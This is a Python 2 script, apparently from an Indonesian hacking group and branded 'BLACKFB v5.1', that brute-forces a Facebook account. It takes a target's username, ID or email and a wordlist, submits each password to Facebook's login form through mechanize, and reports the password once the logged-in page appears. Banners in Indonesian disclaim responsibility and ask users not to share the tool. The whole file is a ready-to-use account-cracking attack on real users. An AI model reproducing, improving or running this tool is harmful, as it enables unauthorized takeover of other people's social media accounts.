#!/usr/bin/python
# -*- coding: utf-8 -*-
##
import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
import os
import urllib
import hashlib
import os
import random
import sys
import time
from time import sleep
os.system('clear')
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
print ('loading..')
sleep(0.1)
mengetik('\33[0;32m> \33[32;1m> \33[0;36m> \33[31;1m> \33[30;1m> \33[33;1m> \33[1;33m>] \33[31;1m100%')
os.system('clear')
sleep(0.1)
print
mengetik('\33[0;32mSELAMAT DATANG DI TOOL KAMI ANONYMOUS CYBER TEAM INDONESIA')
print
mengetik('\33[33;1mfbbrute terbaru new bug server tolong jangan diebar luaskan agar menjaga tool ini agar tidak cepat koid')
print
mengetik('\33[31;1mathor tidak bertanggung jawab bila terjadi hal yg tidak diinginkan dosa tanggung sendiri')
sleep(1)
os.system('clear')
print ("\33[31;1m__________  ___               ________  ________  ")
print ("\33[31;1m|         \ | |              |        | |       \ ")
print ("\33[31;1m|    ()   / | |              |  |TTTTTT |  (0)  / ")
print ("\33[31;1m|        /  | |        _____ |   IIIII| |      /  ")
print ("\33[31;1m|   ====    | |       |_____||  |IIIII  |   ===   ")
print ("\33[31;1m|         \ | |_____         |  |       |       \ ")
print ("\33[31;1m|    ()   / |       |        |  |       |  (0)  / ")
print ("\33[31;1m|________/  |_______|        |,,|       |_____ /  ")

print ("\33[31;1m===========================================")
print ("\33[0;32m|Author : BLACK-HORNET92                  |")
print ("\33[0;32m|       : YUDI                            |")
print ("\33[0;32m|version: 5.1 BLACKFB                     |")
print ("\33[0;32m|Team   : ANONYMOUS CYBER TEAM AINDONESIA |")
print ("\33[31;1m===========================================")
print
mengetik('                 \33[36;1mnow loading..........')
print ("\33[0;32m     ==============================")
print ("\33[1;33m         GUNAKAN WEBMASTER LITE  ")
print ("\33[1;33m       UNTUK MENGEDIT WORDLISNYA ")
print ("\33[1;33m              TERIMAKASIH        ")
print ("\33[0;32m     ==============================")
time.sleep(0.5)
user = raw_input('[?] Target Username/ID/Email >>> ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
print '\n###############🐝🐝 BLACKFB v.5.1🐝🐝##############\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Pass ditemukan👍️ '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] salah coy!🙈 "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()
time.sleep(1)
print 'Password tidak ditemukan racikan wordlisnya gak joss 👉 coba lagi 👈.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
